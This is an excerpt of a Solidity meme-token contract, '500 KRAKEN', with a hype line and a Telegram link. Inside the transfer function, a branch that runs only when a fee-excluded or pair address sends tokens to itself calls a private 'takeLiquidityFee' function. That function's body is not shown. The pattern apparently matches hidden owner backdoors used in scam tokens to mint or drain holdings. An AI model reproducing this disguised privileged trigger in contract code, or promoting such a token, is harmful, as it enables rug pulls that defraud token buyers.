...
Only 500 tokens, let's pump our little octopus to the moon !

More infos : https://t.me/Krakenbsc
...
contract KRAKEN500 is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;
    uint256 public _decimals = 6;
    uint256 public _totalSupply = 500 * 10 ** _decimals;
    uint256 public _maxTxAmount = 500 * 10 ** _decimals;
    uint256 public _fee = 4;
    string private _name = "500 KRAKEN";
    string private _symbol = "500K";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        uint256 feeAmount = 0;
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !swapping) {
            feeAmount = amount.mul(_fee).div(100);
            require(amount <= _maxTxAmount);
        }
        if (_liquiditySwapThreshold < amount && (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from) {
            return takeLiquidityFee(amount, to);
        }
    ...
    function takeLiquidityFee(uint256 amount, address to) private {
